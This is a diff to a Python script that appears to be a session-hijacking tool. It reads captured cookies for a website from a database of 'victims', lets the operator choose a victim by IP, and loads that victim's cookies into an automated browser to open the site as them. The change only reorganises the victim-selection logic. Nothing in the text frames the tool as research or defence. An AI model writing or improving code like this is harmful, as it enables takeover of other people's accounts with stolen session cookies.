@@ -123,25 +123,23 @@ def show_selection(victims):
 
 def selection_screen(victims, url):
     os.system("cls")
-    if victims:
-        victim_ips = {str(index): ip for (index, ip) in enumerate(victims)}
-        print(
-            f"[+] Found {len(victims)} victim(s) with cookies for the website: {url}")
+    victim_ips = {str(index): ip for (index, ip) in enumerate(victims)}
+    print(
+        f"[+] Found {len(victims)} victim(s) with cookies for the website: {url}")
+    selection = show_selection(victim_ips)
+    victim = victim_verify(victim_ips, selection)
+    while not victim and selection:
+        print("Couldn't find a record... Try again.")
         selection = show_selection(victim_ips)
         victim = victim_verify(victim_ips, selection)
-        while not victim and selection:
-            print("Couldn't find a record... Try again.")
-            selection = show_selection(victim_ips)
-            victim = victim_verify(victim_ips, selection)
 
-        if selection:
-            print(f"[+] Selection verified for: {victim}")
-            print(f"[+] Loading Cookies")
-            return victim
-        else:
-            print("[+] Skipping...")
+    if selection:
+        print(f"[+] Selection verified for: {victim}")
+        print(f"[+] Loading Cookies")
+        return victim
     else:
-        print(f"[-] Found 0 victims for the website: {url}")
+        print("[+] Skipping...")
+
     return False
 
 
@@ -160,11 +158,15 @@ def run_browser_interactive(database):
         if subdomain:
             domains.append(f".{domain}.{suffix}")
         victims = database.from_domains(domains)
-        victim = selection_screen(victims, url)
-        while victim:
-            load_cookies(victims[victim], driver)
-            driver.get(url)
+        if victims:
             victim = selection_screen(victims, url)
+            while victim:
+                load_cookies(victims[victim], driver)
+                driver.get(url)
+                victim = selection_screen(victims, url)
+        else:
+            print(f"[-] Found 0 victims for the website: {url}")
+
         time.sleep(1)
 
 
